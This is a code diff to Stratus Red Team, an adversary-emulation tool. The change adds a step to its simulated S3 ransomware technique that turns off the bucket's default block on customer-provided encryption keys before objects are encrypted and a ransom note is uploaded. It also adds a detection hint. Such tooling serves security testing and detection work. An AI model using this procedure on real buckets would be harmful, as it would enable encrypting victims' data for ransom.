@@ -5,15 +5,17 @@ import (
 	_ "embed"
 	"encoding/base64"
 	"fmt"
+	"io"
+	"strconv"
+	"strings"
+
 	"github.com/aws/aws-sdk-go-v2/aws"
 	"github.com/aws/aws-sdk-go-v2/service/s3"
+	"github.com/aws/aws-sdk-go-v2/service/s3/types"
 	"github.com/datadog/stratus-red-team/v2/internal/utils"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus/log"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
-	"io"
-	"strconv"
-	"strings"
 )
 
 //go:embed main.tf
@@ -41,6 +43,7 @@ Warm-up:
 
 Detonation:
 
+- Allow SSE-C on the bucket by clearing the default SSE-C block (new buckets reject customer-provided keys unless this is disabled)
 - List all objects in the bucket
 - Overwrite every file in the bucket with an encrypted version, using [S3 client-side encryption](https://docs.aws.amazon.com/AmazonS3/latest/userguide/UsingClientSideEncryption.html)
 - Upload a ransom note to the bucket
@@ -55,6 +58,7 @@ References:
 		Detection: `
 You can detect ransomware activity by identifying abnormal patterns of objects being downloaded or deleted in the bucket.
 In general, this can be done through [CloudTrail S3 data events](https://docs.aws.amazon.com/AmazonS3/latest/userguide/cloudtrail-logging-s3-info.html#cloudtrail-object-level-tracking) (<code>DeleteObject</code>, <code>DeleteObjects</code>, <code>GetObject</code>, <code>CopyObject</code>),
+CloudTrail management events for <code>PutBucketEncryption</code> (when an attacker unblocks SSE-C),
 [CloudWatch metrics](https://docs.aws.amazon.com/AmazonS3/latest/userguide/metrics-dimensions.html#s3-request-cloudwatch-metrics) (<code>NumberOfObjects</code>),
 or [GuardDuty findings](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-active.html) (<code>[Exfiltration:S3/AnomalousBehavior](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-s3.html#exfiltration-s3-anomalousbehavior)</code>, <code>[Impact:S3/AnomalousBehavior.Delete](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-s3.html#impact-s3-anomalousbehavior-delete)</code>).
 
@@ -120,6 +124,11 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 
 	log.Println("Simulating a ransomware attack on bucket " + bucketName)
 
+	// New S3 buckets block SSE-C by default; allow it so CopyObject with customer keys succeeds.
+	if err := allowSSEC(s3Client, bucketName); err != nil {
+		return fmt.Errorf("failed to allow SSE-C on the bucket: %w", err)
+	}
+
 	if err := utils.DownloadAllObjects(s3Client, bucketName); err != nil {
 		return fmt.Errorf("failed to download bucket objects")
 	}
@@ -134,6 +143,26 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	}
 
 	return nil
+}
+
+func allowSSEC(s3Client *s3.Client, bucketName string) error {
+	log.Println("Allowing SSE-C on bucket " + bucketName + " (new buckets block customer-provided keys by default)")
+	_, err := s3Client.PutBucketEncryption(context.Background(), &s3.PutBucketEncryptionInput{
+		Bucket: &bucketName,
+		ServerSideEncryptionConfiguration: &types.ServerSideEncryptionConfiguration{
+			Rules: []types.ServerSideEncryptionRule{
+				{
+					ApplyServerSideEncryptionByDefault: &types.ServerSideEncryptionByDefault{
+						SSEAlgorithm: types.ServerSideEncryptionAes256,
+					},
+					BlockedEncryptionTypes: &types.BlockedEncryptionTypes{
+						EncryptionType: []types.EncryptionType{types.EncryptionTypeNone},
+					},
+				},
+			},
+		},
+	})
+	return err
 }
 
 func encryptAllObjects(s3Client *s3.Client, bucketName string) error {
